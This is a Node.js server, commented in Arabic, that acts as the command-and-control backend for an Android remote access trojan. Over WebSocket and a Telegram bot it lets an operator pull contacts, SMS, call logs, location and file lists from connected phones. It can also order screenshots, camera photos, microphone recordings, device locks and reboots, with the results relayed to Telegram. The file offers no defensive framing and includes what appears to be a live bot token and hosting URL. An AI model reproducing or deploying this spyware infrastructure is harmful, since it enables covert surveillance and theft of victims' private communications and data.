const express = require('express');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const http = require('http');

// 🔧 الإعدادات - ضع بياناتك هنا
const config = {
    TELEGRAM_TOKEN: "8330048649:AAFYzP0EvuJTYm__yo4AROYvIt3fy-HDGXY", // ضع توكن البوت هنا
    AUTHORIZED_USERS: [7604667042], // ضع أيدي التلجرام الخاص بك هنا
    SERVER_PORT: process.env.PORT || 3000, // Render.com يحدد المنفذ تلقائياً
    SERVER_HOST: "0.0.0.0"
};

// التحقق من البيانات
if (config.TELEGRAM_TOKEN === "1234567890:ABCdefGHIjklMNopQRstUVwxYZ123456789") {
    console.log("❌ يرجى تغيير التوكن في السطر 9");
    process.exit(1);
}

if (config.AUTHORIZED_USERS[0] === 123456789) {
    console.log("❌ يرجى تغيير أيدي التلجرام في السطر 10");
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// 🔧 إصلاح: استخدام polling عادي مع إعدادات آمنة
const bot = new TelegramBot(config.TELEGRAM_TOKEN, {
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

const connectedDevices = new Map();
const userSessions = new Map();

app.use(express.json());

// 🔧 صفحة رئيسية للتأكد من عمل السيرفر
app.get('/', (req, res) => {
    res.json({
        status: '✅ السيرفر يعمل',
        devices: connectedDevices.size,
        uptime: process.uptime()
    });
});

// 🔌 اتصال WebSocket من APK
wss.on('connection', (ws, req) => {
    const deviceId = generateDeviceId();
    const clientIp = req.socket.remoteAddress;
    
    console.log(`📱 APK متصل: ${deviceId} من ${clientIp}`);
    
    connectedDevices.set(deviceId, {
        ws: ws,
        ip: clientIp,
        connectedAt: new Date(),
        info: {}
    });

    // إرسال رسالة ترحيب للAPK
    ws.send(JSON.stringify({
        type: 'welcome',
        deviceId: deviceId,
        message: 'تم الاتصال بنجاح بالسيرفر',
        timestamp: Date.now(),
        server: 'Render.com'
    }));

    // 📨 إرسال إشعار للتلجرام
    sendToTelegram(`📱 جهاز جديد متصل\n🎯 المعرف: ${deviceId}\n🌐 IP: ${clientIp}\n⏰ الوقت: ${new Date().toLocaleString()}`);

    // 📩 استقبال البيانات من APK
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            handleAPKMessage(deviceId, message);
        } catch (error) {
            console.error('❌ خطأ في معالجة رسالة APK:', error);
        }
    });

    ws.on('close', () => {
        console.log(`❌ APK انقطع: ${deviceId}`);
        connectedDevices.delete(deviceId);
        sendToTelegram(`❌ جهاز انقطع: ${deviceId}`);
    });
});

// ⚡ معالجة رسائل APK
function handleAPKMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    console.log(`📩 من ${deviceId}:`, message.type);

    switch (message.type) {
        case 'device_info':
            device.info = message.data;
            sendToTelegram(
                `📊 معلومات الجهاز ${deviceId}\n` +
                `📱 الموديل: ${message.data.model || 'غير معروف'}\n` +
                `🤖 أندرويد: ${message.data.androidVersion || 'غير معروف'}\n` +
                `🔋 البطارية: ${message.data.battery || 'غير معروف'}%`
            );
            break;

        case 'location':
            sendToTelegram(
                `📍 موقع الجهاز ${deviceId}\n` +
                `📌 خط الطول: ${message.data.longitude}\n` +
                `📌 خط العرض: ${message.data.latitude}\n` +
                `🕒 الوقت: ${new Date(message.timestamp).toLocaleString()}`
            );
            break;

        case 'screenshot_result':
            if (message.success) {
                sendToTelegram(`✅ تم التقاط لقطة شاشة من ${deviceId}`);
            } else {
                sendToTelegram(`❌ فشل في لقطة الشاشة من ${deviceId}`);
            }
            break;

        case 'camera_result':
            if (message.success) {
                sendToTelegram(`✅ تم التقاط صورة من الكاميرا ${deviceId}`);
            }
            break;

        case 'file_list':
            const files = message.data.files || [];
            sendToTelegram(
                `📁 ملفات الجهاز ${deviceId}\n` +
                files.slice(0, 10).map(f => `📄 ${f}`).join('\n') +
                (files.length > 10 ? `\n... و ${files.length - 10} ملفات أخرى` : '')
            );
            break;

        case 'contacts_list':
            const contacts = message.data.contacts || [];
            sendToTelegram(
                `👥 جهات الاتصال ${deviceId}\n` +
                contacts.slice(0, 10).map(c => `👤 ${c.name}: ${c.number}`).join('\n') +
                (contacts.length > 10 ? `\n... و ${contacts.length - 10} جهة اتصال` : '')
            );
            break;

        case 'calls_list':
            const calls = message.data.calls || [];
            sendToTelegram(
                `📞 سجل المكالمات ${deviceId}\n` +
                calls.slice(0, 10).map(c => `📞 ${c.number} (${c.duration})`).join('\n')
            );
            break;

        case 'sms_list':
            const sms = message.data.sms || [];
            sendToTelegram(
                `💬 الرسائل النصية ${deviceId}\n` +
                sms.slice(0, 10).map(s => `💬 ${s.number}: ${s.message}`).join('\n')
            );
            break;

        case 'microphone_result':
            if (message.success) {
                sendToTelegram(`🎤 تم التسجيل الصوتي من ${deviceId}`);
            }
            break;

        default:
            console.log('📨 رسالة غير معروفة:', message);
    }
}

// 🤖 أوامر التلجرام
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!config.AUTHORIZED_USERS.includes(chatId)) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك بالوصول');
    }

    const keyboard = {
        reply_markup: {
            keyboard: [
                ['📊 حالة السيرفر', '📋 الأجهزة المتصلة'],
                ['🖼️ لقطة شاشة', '📍 الموقع'],
                ['📁 الملفات', '📷 الكاميرا'],
                ['👥 جهات الاتصال', '📞 سجل المكالمات'],
                ['💬 الرسائل', '🎤 تسجيل صوتي'],
                ['🔒 قفل الجهاز', '🔄 إعادة تشغيل']
            ],
            resize_keyboard: true
        }
    };

    bot.sendMessage(chatId, 
        `🎮 **مرحباً بك في نظام التحكم عن بعد**\n\n` +
        `استخدم الأزرار أدناه للتحكم بالأجهزة المتصلة.\n` +
        `أولاً اختر جهاز من القائمة ثم استخدم الأزرار.`,
        { parse_mode: 'Markdown', ...keyboard }
    );
});

// 📋 قائمة الأجهزة
bot.onText(/📋 الأجهزة المتصلة/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    if (connectedDevices.size === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }

    const devicesKeyboard = {
        reply_markup: {
            keyboard: [
                ...Array.from(connectedDevices.keys()).map(deviceId => [deviceId]),
                ['↩️ رجوع']
            ],
            resize_keyboard: true
        }
    };

    let devicesList = '📱 **الأجهزة المتصلة:**\n\n';
    connectedDevices.forEach((device, deviceId) => {
        devicesList += `🔹 ${deviceId}\n📍 ${device.ip}\n⏰ ${formatTimeDiff(device.connectedAt)}\n\n`;
    });

    userSessions.set(chatId, { step: 'select_device' });

    bot.sendMessage(chatId, devicesList + '\nاختر جهاز من القائمة:', { 
        parse_mode: 'Markdown',
        ...devicesKeyboard 
    });
});

// 📊 حالة السيرفر
bot.onText(/📊 حالة السيرفر/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    bot.sendMessage(chatId,
        `📊 **حالة السيرفر**\n` +
        `🖥️ السيرفر: ✅ نشط\n` +
        `📱 الأجهزة: ${connectedDevices.size} متصل\n` +
        `⏰ التشغيل: ${formatUptime(process.uptime())}\n` +
        `💾 الذاكرة: ${Math.round(process.memoryUsage().rss / 1024 / 1024)}MB`,
        { parse_mode: 'Markdown' }
    );
});

// معالجة اختيار الجهاز
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const text = msg.text;
    const session = userSessions.get(chatId) || {};

    // إذا كان المستخدم يختار جهاز
    if (session.step === 'select_device' && connectedDevices.has(text)) {
        userSessions.set(chatId, { 
            step: 'device_selected', 
            selectedDevice: text 
        });

        const controlKeyboard = {
            reply_markup: {
                keyboard: [
                    ['🖼️ لقطة شاشة', '📍 الموقع'],
                    ['📁 الملفات', '📷 الكاميرا'],
                    ['👥 جهات الاتصال', '📞 سجل المكالمات'],
                    ['💬 الرسائل', '🎤 تسجيل صوتي'],
                    ['🔒 قفل الجهاز', '🔄 إعادة تشغيل'],
                    ['↩️ رجوع للأجهزة']
                ],
                resize_keyboard: true
            }
        };

        bot.sendMessage(chatId, 
            `🎯 **الجهاز المحدد:** ${text}\n\n` +
            `اختر الأمر الذي تريد تنفيذه:`,
            { parse_mode: 'Markdown', ...controlKeyboard }
        );
    }

    // الرجوع للقائمة الرئيسية
    if (text === '↩️ رجوع') {
        userSessions.set(chatId, {});
        const mainKeyboard = {
            reply_markup: {
                keyboard: [
                    ['📊 حالة السيرفر', '📋 الأجهزة المتصلة'],
                    ['🖼️ لقطة شاشة', '📍 الموقع'],
                    ['📁 الملفات', '📷 الكاميرا'],
                    ['👥 جهات الاتصال', '📞 سجل المكالمات'],
                    ['💬 الرسائل', '🎤 تسجيل صوتي'],
                    ['🔒 قفل الجهاز', '🔄 إعادة تشغيل']
                ],
                resize_keyboard: true
            }
        };
        bot.sendMessage(chatId, '🏠 الرئيسية', mainKeyboard);
    }

    // الرجوع لقائمة الأجهزة
    if (text === '↩️ رجوع للأجهزة') {
        userSessions.set(chatId, { step: 'select_device' });
        
        const devicesKeyboard = {
            reply_markup: {
                keyboard: [
                    ...Array.from(connectedDevices.keys()).map(deviceId => [deviceId]),
                    ['↩️ رجوع']
                ],
                resize_keyboard: true
            }
        };

        bot.sendMessage(chatId, '📱 اختر جهاز:', devicesKeyboard);
    }
});

// 🖼️ لقطة شاشة
bot.onText(/🖼️ لقطة شاشة/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    sendToDevice(session.selectedDevice, {
        type: 'take_screenshot'
    });

    bot.sendMessage(chatId, `📸 جاري أخذ لقطة شاشة من ${session.selectedDevice}...`);
});

// 📍 الموقع
bot.onText(/📍 الموقع/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    sendToDevice(session.selectedDevice, {
        type: 'get_location'
    });

    bot.sendMessage(chatId, `📍 جاري الحصول على موقع ${session.selectedDevice}...`);
});

// 📁 الملفات
bot.onText(/📁 الملفات/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    sendToDevice(session.selectedDevice, {
        type: 'list_files',
        path: '/sdcard/'
    });

    bot.sendMessage(chatId, `📁 جاري استعراض ملفات ${session.selectedDevice}...`);
});

// 📷 الكاميرا
bot.onText(/📷 الكاميرا/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    sendToDevice(session.selectedDevice, {
        type: 'take_camera_photo',
        camera: 'back'
    });

    bot.sendMessage(chatId, `📷 جاري التقاط صورة من ${session.selectedDevice}...`);
});

// 👥 جهات الاتصال
bot.onText(/👥 جهات الاتصال/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    sendToDevice(session.selectedDevice, {
        type: 'get_contacts'
    });

    bot.sendMessage(chatId, `👥 جاري جلب جهات الاتصال من ${session.selectedDevice}...`);
});

// 📞 سجل المكالمات
bot.onText(/📞 سجل المكالمات/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    sendToDevice(session.selectedDevice, {
        type: 'get_call_logs'
    });

    bot.sendMessage(chatId, `📞 جاري جلب سجل المكالمات من ${session.selectedDevice}...`);
});

// 💬 الرسائل
bot.onText(/💬 الرسائل/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    sendToDevice(session.selectedDevice, {
        type: 'get_sms'
    });

    bot.sendMessage(chatId, `💬 جاري جلب الرسائل من ${session.selectedDevice}...`);
});

// 🎤 تسجيل صوتي
bot.onText(/🎤 تسجيل صوتي/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    sendToDevice(session.selectedDevice, {
        type: 'record_audio',
        duration: 30000
    });

    bot.sendMessage(chatId, `🎤 جاري التسجيل الصوتي من ${session.selectedDevice}...`);
});

// 🔒 قفل الجهاز
bot.onText(/🔒 قفل الجهاز/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    sendToDevice(session.selectedDevice, {
        type: 'lock_device'
    });

    bot.sendMessage(chatId, `🔒 جاري قفل الجهاز ${session.selectedDevice}...`);
});

// 🔄 إعادة تشغيل
bot.onText(/🔄 إعادة تشغيل/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    sendToDevice(session.selectedDevice, {
        type: 'reboot_device'
    });

    bot.sendMessage(chatId, `🔄 جاري إعادة تشغيل الجهاز ${session.selectedDevice}...`);
});

// ⚡ إرسال أمر لجهاز
function sendToDevice(deviceId, command) {
    const device = connectedDevices.get(deviceId);
    if (!device || !device.ws || device.ws.readyState !== WebSocket.OPEN) {
        sendToTelegram(`❌ الجهاز ${deviceId} غير متصل`);
        return false;
    }

    device.ws.send(JSON.stringify(command));
    return true;
}

// 📨 إرسال رسالة للتلجرام
function sendToTelegram(message) {
    config.AUTHORIZED_USERS.forEach(userId => {
        bot.sendMessage(userId, message).catch(err => {
            console.error('❌ فشل إرسال للتلجرام:', err);
        });
    });
}

// 🛠️ وظائف مساعدة
function generateDeviceId() {
    return 'device_' + Math.random().toString(36).substring(2, 8);
}

function formatUptime(seconds) {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    return `${hours} ساعة, ${minutes} دقيقة`;
}

function formatTimeDiff(date) {
    const diff = Date.now() - date.getTime();
    const minutes = Math.floor(diff / 60000);
    if (minutes < 60) return `${minutes} دقيقة`;
    const hours = Math.floor(minutes / 60);
    return `${hours} ساعة`;
}

// 🚀 بدء السيرفر
server.listen(config.SERVER_PORT, config.SERVER_HOST, () => {
    console.log(`✅ السيرفر يعمل على المنفذ: ${config.SERVER_PORT}`);
    console.log(`🤖 بوت التلجرام جاهز`);
    console.log(`📱 جاهز لاستقبال اتصالات APK`);
    console.log(`🌐 الرابط: https://bot-d4k2.onrender.com`);
});

process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير متوقع:', error);
});
